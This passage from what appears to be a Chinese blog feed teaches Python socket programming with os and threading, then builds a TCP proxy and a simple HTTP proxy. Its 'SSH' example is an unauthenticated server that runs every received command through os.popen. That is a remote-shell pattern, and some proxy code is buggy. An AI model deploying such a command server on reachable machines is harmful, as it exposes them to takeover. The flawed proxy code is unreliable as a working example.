class="keyword">True</span>:</span><br><span class="line">    data = input(<span class="string">'data: '</span>)</span><br><span class="line">    <span class="keyword">if</span> data == <span class="string">'exit'</span>:</span><br><span class="line">        c.send(str.encode(data))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    c.send(str.encode(data))</span><br><span class="line">    reply = c.recv(<span class="number">1024</span>)</span><br><span class="line">    print(<span class="string">'The reply from TCPServer is'</span>,bytes.decode(reply))</span><br><span class="line">c.close()</span><br></pre></td></tr></table></figure><h2 id="模拟burp抓取http包"><a href="#模拟burp抓取http包" class="headerlink" title="模拟burp抓取http包"></a>模拟burp抓取http包</h2><p>想必大家都用过burp，它相当于一个我们使用的客户端与要访问的服务器之间的一个代理，我们要发送到服务器的http请求报文都会通过burp，被burp拦截下来，然后burp可以分析我们发送的http请求包头</p><p>在学习了socket后，我们可以试着模拟一下代理的过程，首先我们先试着抓取http请求</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = socket(AF_INET,SOCK_STREAM)</span><br><span class="line">s.bind((<span class="string">'localhost'</span>,<span class="number">8080</span>))</span><br><span class="line">s.listen(<span class="number">5</span>)</span><br><span class="line">sock,addr = s.accept()</span><br><span class="line">header = bytes.decode(sock.recv(<span class="number">1024</span>))</span><br><span class="line">print(header)</span><br><span class="line">sock.close()</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><p>代码很简单，就是利用socket库的基本方法，这里监听的是本地的8080端口，也就是说我们设置浏览器的代理地址是127.0.0.1，端口是8080</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/python网络编程/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>接下来启动程序，在浏览器中输入网址，监听到http包头</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/python网络编程/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>然后我们要想办法获取访问的主机名，这里利用正则匹配获得</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">match = re.search(<span class="string">r'Host:\s(.*)\s'</span>,http)</span><br><span class="line">CHOST = match.group(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>获取了访问的主机名，我们就可以连接至访问主机，然后将http包头发送给目标主机，再将目标主机返回的信息发回给本地主机，就可以实现代理了，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getHost</span><span class="params">(http)</span>:</span></span><br><span class="line">    match = re.search(<span class="string">r'Host:\s(.*)\s'</span>,http)</span><br><span class="line">    CHOST = match.group(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> CHOST</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyProxy</span><span class="params">(socketserver.BaseRequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.http = self.request.recv(<span class="number">1024</span>)</span><br><span class="line">        self.http = bytes.decode(self.http)</span><br><span class="line">        print(self.http)</span><br><span class="line">        self.CHOST = getHost(self.http)</span><br><span class="line">        c = socket(AF_INET,SOCK_STREAM)</span><br><span class="line">        c.connect((self.CHOST,<span class="number">80</span>))</span><br><span class="line">        c.send(str.encode(http))</span><br><span class="line">        response = []</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            data = c.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> data:</span><br><span class="line">                response.append(data)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        self.response = <span class="string">''</span>.join(response)</span><br><span class="line">        self.sendall(self.response)                </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    LHOST = <span class="string">'localhost'</span></span><br><span class="line">    LPORT = <span class="number">8080</span></span><br><span class="line">    server = socketserver.ThreadingTCPServer((LHOST,LPORT),MyProxy)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure><p>这个程序实践过程中很明显的会出现很多不可预料的错误，要解决这些只能更详细的学习代理的协议，但是简单的思路还是没错的</p>]]></content>
    
    <summary type="html">
    
      Python学习笔记
    
    </summary>
    
      <category term="Python学习笔记" scheme="https://Foxgrin.github.io/categories/Python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Python" scheme="https://Foxgrin.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python网络编程(一)</title>
    <link href="https://Foxgrin.github.io//posts/41404/"/>
    <id>https://Foxgrin.github.io//posts/41404/</id>
    <published>2018-07-22T08:00:00.000Z</published>
    <updated>2018-07-23T03:56:44.075Z</updated>
    
    <content type="html"><![CDATA[<p>Socket是网络编程的一个非常重要的基础，而Python的Socket标准库也提供了非常完善且易用的语法，这篇文章简单介绍一下Socket库的基本用法，以及结合os标准库，threading多线程库实现远程SSH通信，最后模拟TCP代理交互的过程<a id="more"></a></p><h2 id="Socket库基本用法"><a href="#Socket库基本用法" class="headerlink" title="Socket库基本用法"></a>Socket库基本用法</h2><p>Socket是任何一种计算机网络通讯最基础的内容，例如当你在浏览器地址栏中输入一个网址时，你就会打开一个套接字，任何连接到指定的网址并读取响应的页面然后显示出来，在Python中使用Socket库进行通信的对象无非就是两个，一个是服务器端，一个是客户端</p><p>服务器端的主要流程：</p><p>(1)初始化socket()，创建套接字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(AF_INET,SOCK_STREAM)</span><br></pre></td></tr></table></figure><p>这里socket函数是初始化socket，里面的参数默认是AF_INET和SOCK_STREAM</p><p>(2)使用bind()绑定服务器端的ip和端口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s.bind((<span class="string">'127.0.0.1'</span>,<span class="number">6666</span>))</span><br></pre></td></tr></table></figure><p>这里注意传入的参数是一个元组，包含了ip地址和端口号</p><p>(3)使用listen()监听消息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s.listen(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p>这里的参数最大值为5</p><p>(4)使用accept()获取客户端的套接字地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sock,addr = s.accept()</span><br></pre></td></tr></table></figure><p>这个函数有点类似input函数，input函数是等待用户输入才会执行下一步，而accept函数则等待用户的连接才执行下一步，返回也是一个元组(conn,address)，其中conn是新的套接字对象，可以用来接收和发送数据，address是连接的客户端地址</p><p>(5)使用recv()接收数据，send()发送数据与客户端进行交互</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">text = sock.recv(<span class="number">1024</span>)</span><br><span class="line">sock.send(data)</span><br></pre></td></tr></table></figure><p>这里要注意的是在Python 3中send()中的参数必须是字节类型</p><p>客户端的主要流程：</p><p>(1)初始化socket()，创建套接字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c = socket.socket(AF_INET,SOCK_STREAM)</span><br></pre></td></tr></table></figure><p>(2)使用connect()指定连接的ip和端口号连接至指定服务器端</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c.connect((<span class="string">'127.0.0.1'</span>,<span class="number">6666</span>))</span><br></pre></td></tr></table></figure><p>同样的，参数必须是元组，包括要连接的服务器的ip地址和端口号</p><p>(3)使用recv()接收数据，send()发送数据与服务器端进行交互</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">text = c.recv(<span class="number">1024</span>)</span><br><span class="line">c.send(data)</span><br></pre></td></tr></table></figure><p>其实使用socket库其实就只需要注意send()与recv()需要对应起来，不然可能导致客户端或者服务器端处于挂起的状态</p><p>下面我们就来看一个简单的服务器端和客户端的一个例子</p><p>Server(服务器端)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s=socket(AF_INET,SOCK_STREAM) <span class="comment">#初始化socket，创建套接字</span></span><br><span class="line">s.bind((<span class="string">'localhost'</span>,<span class="number">6666</span>)) <span class="comment">#绑定服务器ip地址和端口</span></span><br><span class="line">s.listen(<span class="number">5</span>) <span class="comment">#开始监听</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    sock,addr=s.accept() <span class="comment">#等待客户端连接，获取客户端套接字地址</span></span><br><span class="line">    print(<span class="string">'Connected By'</span>,addr)</span><br><span class="line">    sock.send(str.encode(<span class="string">'Welcome to Server!'</span>)) <span class="comment">#向客户端发送数据</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        data=sock.recv(<span class="number">1024</span>) <span class="comment">#接收客户端发送的数据</span></span><br><span class="line">        print(bytes.decode(data))</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            print(<span class="string">'Client has lost'</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>Client(客户端)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c=socket(AF_INET,SOCK_STREAM) <span class="comment">#初始化套接字</span></span><br><span class="line">c.connect((<span class="string">'127.0.0.1'</span>,<span class="number">6666</span>)) <span class="comment">#连接服务器</span></span><br><span class="line">text=c.recv(<span class="number">1024</span>)</span><br><span class="line">print(bytes.decode(text))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    data=input()</span><br><span class="line">    c.send(str.encode(data))</span><br><span class="line">c.close()</span><br></pre></td></tr></table></figure><p>服务器端使用了死循环以保持一直处于监听状态，客户端发送10次信息与服务器端断开连接，之后服务器继续等待客户端连接，这个程序缺点是服务器端只能支持一个客户端连入，不能支持多个客户端同时连入</p><h2 id="os库基本用法"><a href="#os库基本用法" class="headerlink" title="os库基本用法"></a>os库基本用法</h2><p>Python的os库提供了各种操作系统功能的接口，通过例子简单说明一下几种常用的函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">cmd = input(<span class="string">'Please input a command: '</span>)</span><br><span class="line">a = os.system(cmd) <span class="comment">#执行shell命令</span></span><br><span class="line">print(a) <span class="comment">#返回值为0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmd = input(<span class="string">'Please input a command: '</span>)</span><br><span class="line">a = os.popen(cmd) <span class="comment">#返回一个对象</span></span><br><span class="line">print(a.read())</span><br><span class="line"></span><br><span class="line">print(os.getcwd()) <span class="comment">#获取当前目录</span></span><br><span class="line">print(os.listdir(os.getcwd())) <span class="comment">#返回指定文件夹下包含的文件或文件夹的名字的列表</span></span><br><span class="line">os.chdir(os.getcwd()+<span class="string">'/test'</span>) <span class="comment">#到达指定目录下</span></span><br><span class="line">os.system(<span class="string">'test.py'</span>)</span><br></pre></td></tr></table></figure><p>下面通过os库与socket库结合模拟SSH通信</p><p>服务器端：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">s = socket(AF_INET,SOCK_STREAM)</span><br><span class="line">s.bind((<span class="string">'localhost'</span>,<span class="number">6666</span>))</span><br><span class="line">s.listen(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    sock,addr = s.accept()</span><br><span class="line">    print(<span class="string">'Connected By'</span>,addr)</span><br><span class="line">    sock.send(str.encode(<span class="string">'Welcome to the SSHServer!'</span>))</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        cmd = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        cmd = bytes.decode(cmd)</span><br><span class="line">        <span class="keyword">if</span> cmd == <span class="string">'exit'</span>:</span><br><span class="line">            print(<span class="string">'Client has lost'</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        result = os.popen(cmd).read()</span><br><span class="line">        sock.send(str.encode(result))</span><br></pre></td></tr></table></figure><p>客户端：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">c = socket(AF_INET,SOCK_STREAM)</span><br><span class="line">c.connect((<span class="string">'127.0.0.1'</span>,<span class="number">6666</span>))</span><br><span class="line">text = c.recv(<span class="number">1024</span>)</span><br><span class="line">print(bytes.decode(text))</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    cmd = input(<span class="string">'Please input a command: '</span>)</span><br><span class="line">    c.send(str.encode(cmd))</span><br><span class="line">    <span class="keyword">if</span> cmd == <span class="string">'exit'</span>:</span><br><span class="line">        c.close()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    result = c.recv(<span class="number">1024</span>)</span><br><span class="line">    print(bytes.decode(result))</span><br></pre></td></tr></table></figure><p>当客户端输入exit时，断开与服务器的连接。同样的，这里的服务器端还是只能与一个客户端连接</p><h2 id="利用threading库实现多线程连接"><a href="#利用threading库实现多线程连接" class="headerlink" title="利用threading库实现多线程连接"></a>利用threading库实现多线程连接</h2><p>服务器端：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ThreadHandle</span><span class="params">(sock,addr)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        cmd = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        cmd = bytes.decode(cmd)</span><br><span class="line">        <span class="keyword">if</span> cmd == <span class="string">'exit'</span>:</span><br><span class="line">            print(addr,<span class="string">'has lost'</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        result = os.popen(cmd).read()</span><br><span class="line">        sock.send(str.encode(result))</span><br><span class="line"></span><br><span class="line">s = socket(AF_INET,SOCK_STREAM)</span><br><span class="line">s.bind((<span class="string">'localhost'</span>,<span class="number">6666</span>))</span><br><span class="line">s.listen(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    sock,addr = s.accept()</span><br><span class="line">    print(<span class="string">'Connected By'</span>,addr)</span><br><span class="line">    sock.send(str.encode(<span class="string">'Welcome to SSHServer!'</span>))</span><br><span class="line">    t = Thread(target=ThreadHandle,args=(sock,addr))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure><p>客户端：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">c = socket(AF_INET,SOCK_STREAM)</span><br><span class="line">c.connect((<span class="string">'127.0.0.1'</span>,<span class="number">6666</span>))</span><br><span class="line">text = c.recv(<span class="number">1024</span>)</span><br><span class="line">print(bytes.decode(text))</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    cmd = input(<span class="string">'Please input a command: '</span>)</span><br><span class="line">    c.send(str.encode(cmd))</span><br><span class="line">    <span class="keyword">if</span> cmd == <span class="string">'exit'</span>:</span><br><span class="line">        c.close()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    result = c.recv(<span class="number">1024</span>)</span><br><span class="line">    print(bytes.decode(result))</span><br></pre></td></tr></table></figure><p>服务器端使用了threading标准库的Thread函数开启了多线程，即每个连接都是一个单独的进程</p><h2 id="模拟TCP代理"><a href="#模拟TCP代理" class="headerlink" title="模拟TCP代理"></a>模拟TCP代理</h2><p>我们假设服务器与客户端因为某种原因不能直接通信，这时候就需要一个中间的代理将客户端的信息转发到服务器，再接收服务器返回的数据再转发给客户端，这就是代理的原理</p><p>如果我们把Python中一个socket代表一个连接，那么代理既要与客户端连接又要与服务器连接，就需要两个socket</p><p>我们先来编写服务器端和客户端，跟前面的例子一样，不说明了</p><p>服务器端：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">s = socket(AF_INET,SOCK_STREAM)</span><br><span class="line">s.bind((<span class="string">'localhost'</span>,<span class="number">6666</span>))</span><br><span class="line">s.listen(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    sock,addr = s.accept()</span><br><span class="line">    print(<span class="string">'Connected By'</span>,addr)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        cmd = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        cmd = bytes.decode(cmd)</span><br><span class="line">        <span class="keyword">if</span> cmd == <span class="string">'exit'</span>:</span><br><span class="line">            print(<span class="string">'TCPClient has lost'</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        result = os.popen(cmd).read()</span><br><span class="line">        sock.send(str.encode(result))</span><br></pre></td></tr></table></figure><p>客户端：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'127.0.0.1'</span></span><br><span class="line">PORT = input(<span class="string">'Please input a PORT to connect: '</span>)</span><br><span class="line">PORT = int(PORT)</span><br><span class="line"></span><br><span class="line">c = socket(AF_INET,SOCK_STREAM)</span><br><span class="line">c.connect((HOST,PORT))</span><br><span class="line">text = c.recv(<span class="number">1024</span>)</span><br><span class="line">print(bytes.decode(text))</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    cmd = input(<span class="string">'Please input a command: '</span>)</span><br><span class="line">    c.send(str.encode(cmd))</span><br><span class="line">    <span class="keyword">if</span> cmd == <span class="string">'exit'</span>:</span><br><span class="line">        c.close()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    result = c.recv(<span class="number">1024</span>)</span><br><span class="line">    result = bytes.decode(result)</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure><p>接下来开始编写代理，首先我们先定义建立与客户端连接的socket的函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Server</span><span class="params">(LPORT,CHOST,CPORT)</span>:</span></span><br><span class="line">    c = Client(CHOST,CPORT)</span><br><span class="line">    s = socket(AF_INET,SOCK_STREAM)</span><br><span class="line">    s.bind((<span class="string">'localhost'</span>,LPORT))</span><br><span class="line">    s.listen(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        sock,addr = s.accept()</span><br><span class="line">        print(<span class="string">'Connected By'</span>,addr)</span><br><span class="line">        sock.send(str.encode(<span class="string">'Welcome to TCPProxy!'</span>))</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            cmd = sock.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> bytes.decode(cmd) == <span class="string">'exit'</span>:</span><br><span class="line">                print(<span class="string">'TCPClient '</span>+addr+<span class="string">' has lost'</span>)</span><br><span class="line">                Forward(c,cmd)</span><br><span class="line">                c.close()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            print(<span class="string">'The command from TCPClient is: '</span>+bytes.decode(cmd))</span><br><span class="line">            result = Forward(c,cmd)</span><br><span class="line">            print(<span class="string">'The result from TCPServer is: '</span>+bytes.decode(result))</span><br><span class="line">            sock.send(result)</span><br></pre></td></tr></table></figure><p>因为代理是接收客户端的数据再将数据转发至服务器，再把服务器返回的结果转发到客户端。所以我们不妨把代理看成是客户端的服务器，因此定义函数名为Server，等待客户端的连接，虽然它不然处理客户端发来的数据，但是它可以将数据转发服务器端让服务器端代为处理，这里的参数LPORT是代理绑定的端口号，CHOST和CPORT是传入Client函数的参数，也就是后面讲代理看作是客户端与服务器端连接。</p><p>与客户端建立连接后，接收客户端的数据打印出来后，将数据通过Forward函数转发至服务器端，当客户端输入exit命令时，代理将断开与服务器端的连接和客户端的连接并继续等待客户端的接入</p><p>接下来编写与服务器端连接的函数Client和转发数据的函数Forward</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Client</span><span class="params">(CHOST,CPORT)</span>:</span></span><br><span class="line">    c = socket(AF_INET,SOCK_STREAM)</span><br><span class="line">    c.connect((CHOST,CPORT))</span><br><span class="line">    <span class="keyword">return</span> c</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Forward</span><span class="params">(c,cmd)</span>:</span></span><br><span class="line">    c.send(cmd)</span><br><span class="line">    result = c.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>参数CHOST和CPORT是服务器端的IP和端口</p><p>再编写主函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        LPORT = int(sys.argv[<span class="number">1</span>])</span><br><span class="line">        CHOST = sys.argv[<span class="number">2</span>]</span><br><span class="line">        CPORT = int(sys.argv[<span class="number">3</span>])</span><br><span class="line">        Server(LPORT,CHOST,CPORT)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        usage()</span><br></pre></td></tr></table></figure><p>这里用到了sys标准库的sys.argv[]，简单地说就是我们在cmd中输入执行python程序时获取的参数，假如我们在cmd命令行中输入test.py aaa bbb，那么sys.argv[0]就代表了字符串’test.py’，sys.argv[1]代表了字符串’aaa’，同理sys.argv[2]代表了字符串’bbb’，所以我们要执行这个代理的程序，不仅要输入python程序的文件名，还要同时输入三个参数，否则就出错而执行usage函数，我们就定义usage函数为这个程序的用法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'TCPProxy.py [ListenedPORT] [ConnectedHOST] [ConnectedPORT]'</span>)</span><br></pre></td></tr></table></figure><p>说明了执行这个代理程序应当输入的格式</p><p>下面附上代理端完整的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 